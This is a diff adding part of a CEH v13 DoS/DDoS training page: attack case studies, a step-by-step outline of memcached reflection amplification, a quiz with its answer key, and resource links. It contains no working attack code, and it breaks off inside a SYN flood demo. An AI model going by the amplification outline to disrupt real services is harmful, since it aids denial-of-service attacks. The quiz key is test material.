+                            <li><strong>Configuration Complexity:</strong> Proper setup requirements</li>
+                            <li><strong>False Positive Risk:</strong> Legitimate traffic blocking</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('case-studies')">Next: Case Studies →</button>
+            </div>
+
+            <!-- Case Studies Section -->
+            <div id="case-studies" class="module-section">
+                <h2 class="section-title">📚 Real-World DoS/DDoS Case Studies</h2>
+                
+                <div class="card">
+                    <h3>🎯 Learning from History</h3>
+                    <p>Examining real-world DoS/DDoS attacks provides valuable insights into attack evolution, impact assessment, and defense strategy effectiveness.</p>
+                    
+                    <div class="info-box">
+                        <h4>📖 Why Case Studies Matter</h4>
+                        <ul>
+                            <li><strong>Pattern Recognition:</strong> Identify common attack characteristics</li>
+                            <li><strong>Defense Validation:</strong> Understand what works and what doesn't</li>
+                            <li><strong>Business Impact:</strong> Quantify real-world consequences</li>
+                            <li><strong>Evolution Tracking:</strong> See how attacks have advanced</li>
+                            <li><strong>Preparation Enhancement:</strong> Improve incident response plans</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🌐 Historical Milestone Attacks</h3>
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <h4>2000: Project Rivolta - The First Major DDoS Wave</h4>
+                            <div class="attack-grid">
+                                <div class="attack-card">
+                                    <h4>📊 Attack Details</h4>
+                                    <ul>
+                                        <li><strong>Targets:</strong> Yahoo, Amazon, CNN, eBay</li>
+                                        <li><strong>Duration:</strong> February 2000, multiple days</li>
+                                        <li><strong>Method:</strong> Distributed SYN flood attacks</li>
+                                        <li><strong>Botnet Size:</strong> ~100-150 compromised systems</li>
+                                        <li><strong>Impact:</strong> Major e-commerce disruption</li>
+                                    </ul>
+                                </div>
+                                <div class="attack-card">
+                                    <h4>💡 Lessons Learned</h4>
+                                    <ul>
+                                        <li>First demonstration of DDoS attack potential</li>
+                                        <li>Revealed vulnerability of major internet services</li>
+                                        <li>Led to development of DDoS protection industry</li>
+                                        <li>Showed need for coordinated incident response</li>
+                                        <li>Highlighted importance of network monitoring</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="timeline-item">
+                            <h4>2007: Estonia Cyber Attacks - Nation-State Warfare</h4>
+                            <div class="attack-grid">
+                                <div class="attack-card">
+                                    <h4>📊 Attack Details</h4>
+                                    <ul>
+                                        <li><strong>Targets:</strong> Estonian government, banks, media</li>
+                                        <li><strong>Duration:</strong> April-May 2007, 3 weeks</li>
+                                        <li><strong>Method:</strong> Multi-vector DDoS, botnet-based</li>
+                                        <li><strong>Scale:</strong> Millions of bots, international</li>
+                                        <li><strong>Impact:</strong> National infrastructure disruption</li>
+                                    </ul>
+                                </div>
+                                <div class="attack-card">
+                                    <h4>💡 Lessons Learned</h4>
+                                    <ul>
+                                        <li>First cyber attack against an entire nation</li>
+                                        <li>Demonstrated political motivation for DDoS</li>
+                                        <li>Showed vulnerability of digital society</li>
+                                        <li>Led to NATO cyber defense initiatives</li>
+                                        <li>Highlighted international cooperation needs</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🤖 Modern IoT-Based Attacks</h3>
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>💥 Mirai Botnet (2016) - The IoT Revolution</h4>
+                            <div class="lab-steps">
+                                <strong>Attack Timeline:</strong>
+                                <ul>
+                                    <li><strong>August 2016:</strong> Mirai source code developed</li>
+                                    <li><strong>September 2016:</strong> Major attacks begin (KrebsOnSecurity - 665 Gbps)</li>
+                                    <li><strong>October 2016:</strong> Dyn DNS attack disrupts major websites</li>
+                                    <li><strong>October 2016:</strong> Source code released publicly</li>
+                                </ul>
+                                
+                                <strong>Technical Analysis:</strong>
+                                <div class="code-block">
+Attack Vector: IoT device compromise via default credentials
+Botnet Size: 400,000+ devices at peak
+Geographic Scope: Global (primarily Asia, Latin America)
+Target Devices: IP cameras, routers, DVRs, smart TVs
+Attack Methods: GRE floods, SYN floods, ACK floods, stomp floods
+                                </div>
+                                
+                                <strong>Impact Assessment:</strong>
+                                <ul>
+                                    <li>Twitter, Netflix, PayPal, Spotify unavailable</li>
+                                    <li>East Coast US internet disruption</li>
+                                    <li>Demonstrated IoT security vulnerabilities</li>
+                                    <li>Spawned hundreds of variants</li>
+                                    <li>Changed DDoS threat landscape permanently</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="lab-card">
+                            <h4>⚡ GitHub Attack (2018) - Record-Breaking Amplification</h4>
+                            <div class="lab-steps">
+                                <strong>Attack Characteristics:</strong>
+                                <ul>
+                                    <li><strong>Peak Traffic:</strong> 1.35 Tbps</li>
+                                    <li><strong>Duration:</strong> ~20 minutes total</li>
+                                    <li><strong>Method:</strong> Memcached amplification</li>
+                                    <li><strong>Amplification Factor:</strong> Up to 51,200x</li>
+                                    <li><strong>Reflection Servers:</strong> Thousands of exposed memcached instances</li>
+                                </ul>
+                                
+                                <strong>Attack Flow:</strong>
+                                <div class="code-block">
+1. Attacker spoofs GitHub IP addresses
+2. Sends small requests to memcached servers (port 11211)
+3. Memcached servers return large responses to GitHub
+4. Traffic amplified by factor of 10,000-50,000x
+5. GitHub overwhelmed by reflected traffic
+                                </div>
+                                
+                                <strong>Mitigation Success:</strong>
+                                <ul>
+                                    <li>Akamai DDoS protection activated within minutes</li>
+                                    <li>Traffic scrubbing centers filtered malicious requests</li>
+                                    <li>Service restored within 20 minutes</li>
+                                    <li>Demonstrated effectiveness of cloud-based protection</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎮 Gaming Industry Attacks</h3>
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>🎯 PlayStation Network (2014)</h4>
+                            <ul>
+                                <li><strong>Attacker:</strong> Lizard Squad</li>
+                                <li><strong>Duration:</strong> Christmas week 2014</li>
+                                <li><strong>Impact:</strong> 77 million users affected</li>
+                                <li><strong>Method:</strong> Multi-vector DDoS</li>
+                                <li><strong>Consequence:</strong> $15M+ in losses</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🎯 Steam Network (2015)</h4>
+                            <ul>
+                                <li><strong>Attacker:</strong> DERP Trolling</li>
+                                <li><strong>Duration:</strong> Multiple incidents</li>
+                                <li><strong>Impact:</strong> Gaming service disruption</li>
+                                <li><strong>Method:</strong> Coordinated DDoS campaigns</li>
+                                <li><strong>Motivation:</strong> Attention seeking</li>
+                            </ul>
+                        </div>
+                        <div class="attack-card">
+                            <h4>🎯 Blizzard Entertainment (2016)</h4>
+                            <ul>
+                                <li><strong>Attacker:</strong> PoodleCorp</li>
+                                <li><strong>Duration:</strong> Multiple targeted attacks</li>
+                                <li><strong>Impact:</strong> World of Warcraft, Overwatch down</li>
+                                <li><strong>Method:</strong> Application-layer attacks</li>
+                                <li><strong>Consequence:</strong> Player frustration, revenue loss</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🏦 Financial Sector Attacks</h3>
+                    <div class="labs-container">
+                        <div class="lab-card">
+                            <h4>💰 Operation Ababil (2012-2013) - Banking Sector Disruption</h4>
+                            <div class="lab-steps">
+                                <strong>Campaign Overview:</strong>
+                                <ul>
+                                    <li><strong>Attacker:</strong> Izz ad-Din al-Qassam Cyber Fighters</li>
+                                    <li><strong>Duration:</strong> September 2012 - May 2013</li>
+                                    <li><strong>Targets:</strong> Major US banks (JPMorgan, Bank of America, Wells Fargo)</li>
+                                    <li><strong>Motivation:</strong> Political (anti-Islamic video protest)</li>
+                                </ul>
+                                
+                                <strong>Attack Characteristics:</strong>
+                                <ul>
+                                    <li>Multi-phase campaign with increasing sophistication</li>
+                                    <li>Initially used itsoknoproblembro toolkit</li>
+                                    <li>Later evolved to more advanced methods</li>
+                                    <li>Combined DDoS with other attack vectors</li>
+                                    <li>Targeted both public websites and internal systems</li>
+                                </ul>
+                                
+                                <strong>Business Impact:</strong>
+                                <ul>
+                                    <li>Customer access disruption for millions</li>
+                                    <li>Estimated $100M+ in mitigation costs</li>
+                                    <li>Increased cybersecurity investments</li>
+                                    <li>Enhanced industry cooperation initiatives</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📈 Attack Evolution Analysis</h3>
+                    <div class="stats-container">
+                        <div class="stat-card">
+                            <div class="stat-number">2000</div>
+                            <div>First Major DDoS (Yahoo)</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-number">100 Mbps</div>
+                            <div>Early Attack Sizes</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-number">2.54 Tbps</div>
+                            <div>Largest Recorded (2024)</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-number">25,400x</div>
+                            <div>Growth Factor</div>
+                        </div>
+                    </div>
+                    
+                    <div class="timeline">
+                        <div class="timeline-item">
+                            <h4>🌊 Volume Evolution</h4>
+                            <p>Attack sizes have grown from megabits to terabits per second, driven by larger botnets and amplification techniques.</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>🎯 Target Diversification</h4>
+                            <p>From individual websites to critical infrastructure, including DNS providers, CDNs, and cloud services.</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>🔧 Method Sophistication</h4>
+                            <p>Simple flood attacks have evolved to multi-vector, adaptive attacks that evade defenses.</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h4>💰 Commercialization</h4>
+                            <p>Professional cybercrime services now offer DDoS-as-a-Service to low-skill attackers.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('quiz')">Next: Assessment →</button>
+            </div>
+
+            <!-- Quiz Section -->
+            <div id="quiz" class="module-section">
+                <h2 class="section-title">📝 Module 10 Assessment</h2>
+                
+                <div class="card">
+                    <h3>🎯 Comprehensive Knowledge Evaluation</h3>
+                    <p>Test your understanding of DoS/DDoS concepts, attack techniques, detection methods, and countermeasures with this comprehensive assessment.</p>
+                    
+                    <div style="background: linear-gradient(135deg, rgba(52, 152, 219, 0.1), rgba(41, 128, 185, 0.1)); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                        <strong>Assessment Details:</strong>
+                        <ul style="margin: 10px 0; padding-left: 20px;">
+                            <li>20 multiple-choice questions</li>
+                            <li>Passing score: 80% (16/20 correct)</li>
+                            <li>Time limit: 30 minutes</li>
+                            <li>Covers all Module 10 topics</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="quiz-container" id="quizContainer">
+                    <!-- Quiz questions will be populated by JavaScript -->
+                </div>
+
+                <div class="card" id="quizResults" style="display: none;">
+                    <h3>📊 Assessment Results</h3>
+                    <div id="resultsContent">
+                        <!-- Results will be populated by JavaScript -->
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('resources')">View Resources →</button>
+            </div>
+
+            <!-- Resources Section -->
+            <div id="resources" class="module-section">
+                <h2 class="section-title">📚 Essential Resources & References</h2>
+                
+                <div class="card">
+                    <h3>🎯 Official CEH v13 Resources</h3>
+                    <div class="resources-grid">
+                        <div class="resource-card">
+                            <h4>🏢 EC-Council Official</h4>
+                            <ul style="line-height: 1.8;">
+                                <li><a href="https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/" target="_blank">CEH v13 Certification Page</a></li>
+                                <li><a href="https://www.eccouncil.org/cehv13-brochure/" target="_blank">CEH v13 Official Brochure</a></li>
+                                <li><a href="https://www.eccouncil.org/cybersecurity-exchange/" target="_blank">EC-Council Cybersecurity Exchange</a></li>
+                                <li><a href="https://ilabs.eccouncil.org/" target="_blank">EC-Council iLabs Platform</a></li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>📖 Technical Documentation</h4>
+                            <ul style="line-height: 1.8;">
+                                <li><a href="https://www.cloudflare.com/learning/ddos/" target="_blank">Cloudflare DDoS Learning Center</a></li>
+                                <li><a href="https://www.akamai.com/resources/ddos-protection" target="_blank">Akamai DDoS Protection Resources</a></li>
+                                <li><a href="https://aws.amazon.com/shield/ddos-attack-protection/" target="_blank">AWS Shield DDoS Protection</a></li>
+                                <li><a href="https://www.netscout.com/what-is-ddos" target="_blank">Netscout DDoS Research</a></li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>🔧 Tools & Utilities</h4>
+                            <ul style="line-height: 1.8;">
+                                <li><a href="https://nmap.org/nping/" target="_blank">Nping - Network Packet Generation</a></li>
+                                <li><a href="https://www.hping.org/" target="_blank">hping3 - Active Network Smashing Tool</a></li>
+                                <li><a href="https://scapy.net/" target="_blank">Scapy - Packet Manipulation Library</a></li>
+                                <li><a href="https://www.wireshark.org/" target="_blank">Wireshark - Network Protocol Analyzer</a></li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>📊 Research & Reports</h4>
+                            <ul style="line-height: 1.8;">
+                                <li><a href="https://www.netscout.com/threatreport" target="_blank">Netscout Threat Intelligence Report</a></li>
+                                <li><a href="https://www.kaspersky.com/blog/ddos-report-q3-2023/" target="_blank">Kaspersky DDoS Reports</a></li>
+                                <li><a href="https://radar.cloudflare.com/" target="_blank">Cloudflare Radar - Internet Insights</a></li>
+                                <li><a href="https://www.f5.com/labs/ddos" target="_blank">F5 Labs DDoS Research</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎓 Advanced Learning Resources</h3>
+                    <div class="resources-grid">
+                        <div class="resource-card">
+                            <h4>📚 Books & Publications</h4>
+                            <ul style="line-height: 1.8;">
+                                <li>"DDoS Attacks: Evolution, Detection, Prevention, and Reaction" by Christos Douligeris</li>
+                                <li>"Network Security Assessment" by Chris McNab</li>
+                                <li>"The Web Application Hacker's Handbook" by Dafydd Stuttard</li>
+                                <li>"Practical Malware Analysis" by Michael Sikorski</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>🌐 Online Courses</h4>
+                            <ul style="line-height: 1.8;">
+                                <li>SANS SEC542: Web App Penetration Testing</li>
+                                <li>Cybrary: Advanced Penetration Testing</li>
+                                <li>Pluralsight: Ethical Hacking Series</li>
+                                <li>Udemy: Complete Ethical Hacking Course</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>🏆 Certifications</h4>
+                            <ul style="line-height: 1.8;">
+                                <li>CEH Master: Advanced practical certification</li>
+                                <li>GCIH: SANS Incident Handler</li>
+                                <li>CISSP: Information Systems Security Professional</li>
+                                <li>CCSP: Cloud Security Professional</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="resource-card">
+                            <h4>🔬 Research Organizations</h4>
+                            <ul style="line-height: 1.8;">
+                                <li>NIST Cybersecurity Framework</li>
+                                <li>OWASP Application Security</li>
+                                <li>SANS Institute Research</li>
+                                <li>IEEE Security & Privacy</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for detailed information -->
+    <div id="detailModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <div id="modalContent"></div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let currentSection = 'overview';
+        let completedSections = new Set();
+        let sectionOrder = ['overview', 'dos-concepts', 'attack-types', 'botnets', 'tools', 'detection', 'countermeasures', 'case-studies', 'quiz', 'resources'];
+        let quizAnswers = {};
+        let quizScore = 0;
+        let startTime = Date.now();
+        let totalStudyTime = 0;
+
+        // Quiz questions database
+        const quizQuestions = [
+            {
+                question: "What is the primary difference between a DoS and DDoS attack?",
+                options: [
+                    "DoS attacks are more powerful than DDoS attacks",
+                    "DoS uses a single source, DDoS uses multiple distributed sources",
+                    "DDoS attacks only target web servers",
+                    "There is no significant difference"
+                ],
+                correct: 1,
+                explanation: "The key difference is that DoS attacks originate from a single source, while DDoS (Distributed DoS) attacks use multiple compromised systems (botnet) to amplify the attack power."
+            },
+            {
+                question: "Which type of DDoS attack primarily aims to consume network bandwidth?",
+                options: [
+                    "Protocol attacks",
+                    "Application layer attacks", 
+                    "Volumetric attacks",
+                    "Amplification attacks"
+                ],
+                correct: 2,
+                explanation: "Volumetric attacks focus on consuming the bandwidth of the target network or service by generating massive amounts of traffic, typically measured in bits per second (bps)."
+            },
+            {
+                question: "What is the primary mechanism behind a SYN flood attack?",
+                options: [
+                    "Sending large ICMP packets to overwhelm the target",
+                    "Exploiting the TCP three-way handshake by not completing connections",
+                    "Flooding the target with UDP packets on random ports",
+                    "Consuming bandwidth with large file downloads"
+                ],
+                correct: 1,
+                explanation: "SYN flood attacks exploit the TCP handshake by sending SYN packets with spoofed source IPs, causing the server to keep half-open connections in memory while waiting for ACK packets that never arrive."
+            },
+            {
+                question: "Which protocol offers the highest amplification factor in reflection attacks?",
+                options: [
+                    "DNS (179x amplification)",
+                    "NTP (556x amplification)",
+                    "SNMP (650x amplification)",
+                    "Memcached (51,200x amplification)"
+                ],
+                correct: 3,
+                explanation: "Memcached amplification attacks can achieve amplification factors of up to 51,200x, making them extremely dangerous. This was demonstrated in the 2018 GitHub attack."
+            },
+            {
+                question: "What was significant about the Mirai botnet?",
+                options: [
+                    "It was the first DDoS attack ever recorded",
+                    "It primarily targeted IoT devices with default credentials",
+                    "It only used Windows computers for attacks",
+                    "It was created by government agencies"
+                ],
+                correct: 1,
+                explanation: "Mirai revolutionized DDoS attacks by targeting IoT devices (cameras, routers, DVRs) that used default or weak credentials, creating massive botnets of up to 400,000 devices."
+            },
+            {
+                question: "Which attack technique involves maintaining many partial HTTP connections?",
+                options: [
+                    "HTTP Flood",
+                    "Slowloris",
+                    "SYN Flood", 
+                    "UDP Flood"
+                ],
+                correct: 1,
+                explanation: "Slowloris attacks maintain many partial HTTP connections by sending incomplete HTTP requests and periodically sending additional headers, never completing the requests to exhaust server connection pools."
+            },
+            {
+                question: "What is the primary advantage of using a P2P (peer-to-peer) botnet topology?",
+                options: [
+                    "Faster command distribution",
+                    "Lower bandwidth requirements",
+                    "No single point of failure",
+                    "Easier to manage and control"
+                ],
+                correct: 2,
+                explanation: "P2P botnet topology eliminates the single point of failure present in centralized C&C architectures, making the botnet more resilient to takedown efforts."
+            },
+            {
+                question: "Which metric is most important when measuring volumetric attacks?",
+                options: [
+                    "Requests per second (rps)",
+                    "Packets per second (pps)",
+                    "Bits per second (bps)",
+                    "Connections per second (cps)"
+                ],
+                correct: 2,
+                explanation: "Volumetric attacks are primarily measured in bits per second (bps) as they focus on consuming network bandwidth. Protocol attacks use pps, and application attacks use rps."
+            },
+            {
+                question: "What is the main purpose of traffic scrubbing in DDoS mitigation?",
+                options: [
+                    "To increase network bandwidth",
+                    "To filter out malicious traffic and forward only legitimate requests",
+                    "To encrypt all network communications",
+                    "To compress data to reduce bandwidth usage"
+                ],
+                correct: 1,
+                explanation: "Traffic scrubbing centers analyze incoming traffic, filter out malicious requests, and forward only legitimate traffic to the protected servers."
+            },
+            {
+                question: "Which detection method is most effective against zero-day DDoS attacks?",
+                options: [
+                    "Signature-based detection",
+                    "Rule-based filtering",
+                    "Behavioral analysis and machine learning",
+                    "Manual traffic inspection"
+                ],
+                correct: 2,
+                explanation: "Behavioral analysis and machine learning can detect previously unknown attack patterns by identifying deviations from normal traffic behavior, making them effective against zero-day attacks."
+            },
+            {
+                question: "What was the peak traffic volume of the 2018 GitHub DDoS attack?",
+                options: [
+                    "665 Gbps",
+                    "1.2 Tbps",
+                    "1.35 Tbps",
+                    "2.3 Tbps"
+                ],
+                correct: 2,
+                explanation: "The 2018 GitHub attack reached 1.35 Tbps using memcached amplification, making it one of the largest recorded DDoS attacks at the time."
+            },
+            {
+                question: "Which botnet was responsible for the 2016 Dyn DNS attack?",
+                options: [
+                    "Conficker",
+                    "Zeus",
+                    "Mirai",
+                    "Kelihos"
+                ],
+                correct: 2,
+                explanation: "The Mirai botnet was responsible for the October 2016 Dyn DNS attack that disrupted major websites including Twitter, Netflix, and PayPal."
+            },
+            {
+                question: "What is the primary goal of application layer (Layer 7) DDoS attacks?",
+                options: [
+                    "Consume network bandwidth",
+                    "Overwhelm routing tables",
+                    "Exhaust application resources and services",
+                    "Corrupt network packets"
+                ],
+                correct: 2,
+                explanation: "Layer 7 attacks target specific applications and services, aiming to exhaust server resources like CPU, memory, and database connections rather than just consuming bandwidth."
+            },
+            {
+                question: "Which technique is commonly used to make DDoS attacks appear to come from legitimate sources?",
+                options: [
+                    "IP spoofing",
+                    "DNS poisoning",
+                    "ARP spoofing",
+                    "MAC flooding"
+                ],
+                correct: 0,
+                explanation: "IP spoofing is used to forge source IP addresses, making attack traffic appear to come from legitimate sources or to enable reflection/amplification attacks."
+            },
+            {
+                question: "What is the typical cost range for hiring a DDoS attack service for one hour?",
+                options: [
+                    "$1-$2",
+                    "$5-$10",
+                    "$50-$100",
+                    "$500-$1000"
+                ],
+                correct: 1,
+                explanation: "DDoS-for-hire services typically charge $5-$10 per hour for basic attacks, making DDoS attacks accessible to low-skill attackers through the cybercrime-as-a-service model."
+            },
+            {
+                question: "Which characteristic distinguishes protocol attacks from volumetric attacks?",
+                options: [
+                    "Protocol attacks use more bandwidth",
+                    "Protocol attacks exploit network protocol weaknesses and state tables",
+                    "Protocol attacks are easier to detect",
+                    "Protocol attacks only target web servers"
+                ],
+                correct: 1,
+                explanation: "Protocol attacks exploit weaknesses in network protocols and target state tables in network infrastructure components, while volumetric attacks focus on consuming bandwidth."
+            },
+            {
+                question: "What is the recommended approach for DDoS protection strategy?",
+                options: [
+                    "Rely solely on ISP filtering",
+                    "Use only cloud-based protection",
+                    "Implement a multi-layered defense-in-depth approach",
+                    "Focus only on bandwidth over-provisioning"
+                ],
+                correct: 2,
+                explanation: "Effective DDoS protection requires a multi-layered defense-in-depth strategy combining prevention, detection, mitigation, response, and recovery across all network layers."
+            },
+            {
+                question: "Which phase of a botnet lifecycle involves malware distribution and initial system compromise?",
+                options: [
+                    "Registration & Communication",
+                    "Initial Compromise",
+                    "Maintenance & Updates",
+                    "Monetization"
+                ],
+                correct: 1,
+                explanation: "Initial Compromise is the first phase where systems are infected through various methods like phishing, drive-by downloads, or exploiting vulnerabilities."
+            },
+            {
+                question: "What is the primary advantage of using CDN (Content Delivery Network) for DDoS protection?",
+                options: [
+                    "Faster website loading times",
+                    "Better SEO rankings",
+                    "Distributed traffic absorption and geographic load distribution",
+                    "Reduced hosting costs"
+                ],
+                correct: 2,
+                explanation: "CDNs provide DDoS protection by distributing traffic across multiple geographic locations, absorbing attack traffic, and maintaining service availability through their global infrastructure."
+            },
+            {
+                question: "Which tool is specifically designed for application layer DoS testing and demonstrates low-bandwidth attacks?",
+                options: [
+                    "hping3",
+                    "Nmap",
+                    "Slowloris",
+                    "Apache Bench"
+                ],
+                correct: 2,
+                explanation: "Slowloris is specifically designed to demonstrate application layer DoS attacks by maintaining many partial HTTP connections with minimal bandwidth usage, making it an effective low-bandwidth attack tool."
+            }
+        ];
+
+        // Initialize the application
+        document.addEventListener('DOMContentLoaded', function() {
+            showSection('overview');
+            updateProgress();
+            
+            // Add keyboard navigation
+            document.addEventListener('keydown', handleKeyPress);
+        });
+
+        // Navigation functions
+        function showSection(sectionId) {
+            // Hide all sections
+            document.querySelectorAll('.module-section').forEach(section => {
+                section.classList.remove('active');
+            });
+            
+            // Show selected section
+            document.getElementById(sectionId).classList.add('active');
+            
+            // Update navigation buttons
+            document.querySelectorAll('.nav-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Mark section as completed
+            completedSections.add(currentSection);
+            currentSection = sectionId;
+            
+            // Special handling for quiz section
+            if (sectionId === 'quiz') {
+                generateQuiz();
+            }
+            
+            updateProgress();
+            
+            // Scroll to top
+            window.scrollTo(0, 0);
+        }
+
+        function updateProgress() {
+            const totalSections = sectionOrder.length;
+            const completed = completedSections.size;
+            const percentage = Math.round((completed / totalSections) * 100);
+            
+            document.getElementById('progressBar').style.width = percentage + '%';
+            document.getElementById('progressText').textContent = `Progress: ${percentage}% Complete`;
+        }
+
+        // Keyboard navigation
+        function handleKeyPress(event) {
+            if (event.key === 'Escape') {
+                closeModal();
+            } else if (event.key === 'ArrowLeft') {
+                navigateSection(-1);
+            } else if (event.key === 'ArrowRight') {
+                navigateSection(1);
+            }
+        }
+
+        function navigateSection(direction) {
+            const currentIndex = sectionOrder.indexOf(currentSection);
+            let newIndex = currentIndex + direction;
+            
+            if (newIndex < 0) newIndex = sectionOrder.length - 1;
+            if (newIndex >= sectionOrder.length) newIndex = 0;
+            
+            const newSection = sectionOrder[newIndex];
+            
+            // Trigger click on corresponding nav button
+            document.querySelector(`[onclick="showSection('${newSection}')"]`).click();
+        }
+
+        // Quiz functions
+        function generateQuiz() {
+            const container = document.getElementById('quizContainer');
+            container.innerHTML = '';
+            
+            quizQuestions.forEach((q, index) => {
+                const questionDiv = document.createElement('div');
+                questionDiv.className = 'question';
+                questionDiv.innerHTML = `
+                    <h4>Question ${index + 1}: ${q.question}</h4>
+                    <div class="options">
+                        ${q.options.map((option, optIndex) => `
+                            <label>
+                                <input type="radio" name="q${index}" value="${optIndex}">
+                                ${option}
+                            </label>
+                        `).join('')}
+                    </div>
+                `;
+                container.appendChild(questionDiv);
+            });
+            
+            // Add submit button
+            const submitBtn = document.createElement('button');
+            submitBtn.className = 'btn btn-success';
+            submitBtn.textContent = 'Submit Quiz';
+            submitBtn.onclick = submitQuiz;
+            container.appendChild(submitBtn);
+        }
+
+        function submitQuiz() {
+            let correct = 0;
+            const results = [];
+            
+            quizQuestions.forEach((q, index) => {
+                const selected = document.querySelector(`input[name="q${index}"]:checked`);
+                if (selected) {
+                    const answer = parseInt(selected.value);
+                    quizAnswers[index] = answer;
+                    
+                    if (answer === q.correct) {
+                        correct++;
+                        results.push({
+                            question: index + 1,
+                            correct: true,
+                            explanation: q.explanation
+                        });
+                    } else {
+                        results.push({
+                            question: index + 1,
+                            correct: false,
+                            selected: q.options[answer],
+                            correctAnswer: q.options[q.correct],
+                            explanation: q.explanation
+                        });
+                    }
+                }
+            });
+            
+            quizScore = (correct / quizQuestions.length) * 100;
+            displayResults(results, correct, quizQuestions.length);
+        }
+
+        function displayResults(results, correct, total) {
+            const resultsDiv = document.getElementById('quizResults');
+            const percentage = Math.round((correct / total) * 100);
+            
+            let resultHTML = `
+                <div style="text-align: center; margin: 20px 0;">
+                    <div style="font-size: 3em; font-weight: bold; color: ${percentage >= 80 ? '#27ae60' : '#e74c3c'};">
+                        ${percentage}%
+                    </div>
+                    <div style="font-size: 1.2em; margin: 10px 0;">
+                        ${correct} out of ${total} questions correct
+                    </div>
+                    <div style="padding: 15px; background: ${percentage >= 80 ? 'var(--gradient-success)' : 'var(--gradient-danger)'}; color: white; border-radius: 10px; margin: 20px 0;">
+                        ${percentage >= 80 ? '🎉 Congratulations! You passed!' : '📚 Keep studying and try again!'}
+                    </div>
+                </div>
+                
+                <h4>📊 Detailed Results:</h4>
+            `;
+            
+            results.forEach(result => {
+                resultHTML += `
+                    <div style="margin: 15px 0; padding: 15px; border-radius: 8px; background: ${result.correct ? '#d4edda' : '#f8d7da'}; border-left: 4px solid ${result.correct ? '#28a745' : '#dc3545'};">
+                        <strong>Question ${result.question}: ${result.correct ? '✅ Correct' : '❌ Incorrect'}</strong>
+                        ${!result.correct ? `
+                            <br><strong>Your answer:</strong> ${result.selected}
+                            <br><strong>Correct answer:</strong> ${result.correctAnswer}
+                        ` : ''}
+                        <br><strong>Explanation:</strong> ${result.explanation}
+                    </div>
+                `;
+            });
+            
+            document.getElementById('resultsContent').innerHTML = resultHTML;
+            resultsDiv.style.display = 'block';
+            
+            // Scroll to results
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Modal functions
+        function showModal(title, content) {
+            document.getElementById('modalContent').innerHTML = `
+                <h2>${title}</h2>
+                ${content}
+            `;
+            document.getElementById('detailModal').style.display = 'block';
+        }
+
+        function closeModal() {
+            document.getElementById('detailModal').style.display = 'none';
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('detailModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+
+        // Utility functions
+        function calculateStudyTime() {
+            totalStudyTime = Math.round((Date.now() - startTime) / 1000 / 60); // minutes
+            return totalStudyTime;
+        }
+
+        function resetQuiz() {
+            quizAnswers = {};
+            quizScore = 0;
+            document.getElementById('quizResults').style.display = 'none';
+            generateQuiz();
+        }
+
+        // Auto-save progress
+        setInterval(() => {
+            localStorage.setItem('ceh_module10_progress', JSON.stringify({
+                completedSections: Array.from(completedSections),
+                currentSection: currentSection,
+                studyTime: calculateStudyTime(),
+                quizScore: quizScore
+            }));
+        }, 30000); // Save every 30 seconds
+
+        // Load saved progress
+        function loadProgress() {
+            const saved = localStorage.getItem('ceh_module10_progress');
+            if (saved) {
+                const progress = JSON.parse(saved);
+                completedSections = new Set(progress.completedSections);
+                if (progress.currentSection) {
+                    currentSection = progress.currentSection;
+                }
+                if (progress.studyTime) {
+                    totalStudyTime = progress.studyTime;
+                }
+                if (progress.quizScore) {
+                    quizScore = progress.quizScore;
+                }
+                updateProgress();
+            }
+        }
+
+        // Initialize progress loading
+        document.addEventListener('DOMContentLoaded', function() {
+            loadProgress();
+        });
+
+        // Additional helper functions for enhanced interactivity
+        function showAttackDemo(attackType) {
+            let content = '';
+            
+            switch(attackType) {
+                case 'syn_flood':
+                    content = `
+                        <h3>🎯 SYN Flood Attack Demonstration</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Attack Simulation (Educational Only)</h4>
